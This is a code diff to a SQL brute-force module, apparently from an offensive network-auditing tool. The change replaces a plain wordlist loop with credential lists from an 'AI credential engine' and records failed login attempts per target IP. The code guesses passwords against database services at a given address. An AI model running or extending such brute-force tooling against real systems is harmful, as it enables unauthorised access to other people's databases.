@@ -157,21 +157,34 @@ class SQLConnector:
                     self.save_results()
                     self.remove_duplicates()
                     success_flag[0] = True
-                    
+            else:
+                try:
+                    from actions.ai_credential_engine import mark_failure
+                    mark_failure(adresse_ip, "sql", (user, password))
+                except Exception:
+                    pass
             self.queue.task_done()
             progress.update(task_id, advance=1)
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()
 
-        total_tasks = len(self.users) * len(self.passwords)
-        
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, port))
+        try:
+            from actions.ai_credential_engine import build_credential_list
+            cred_list = build_credential_list(
+                self.shared_data, self.users, self.passwords,
+                ip=adresse_ip, service="sql",
+            )
+        except Exception as exc:
+            logger.warning("ai_creds unavailable (%s) — using wordlist only", exc)
+            cred_list = [(u, pw) for u in self.users for pw in self.passwords]
+        total_tasks = len(cred_list)
+
+        for user, password in cred_list:
+            if self.shared_data.orchestrator_should_exit:
+                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                return False, []
+            self.queue.put((adresse_ip, user, password, port))
 
         success_flag = [False]
         threads = []
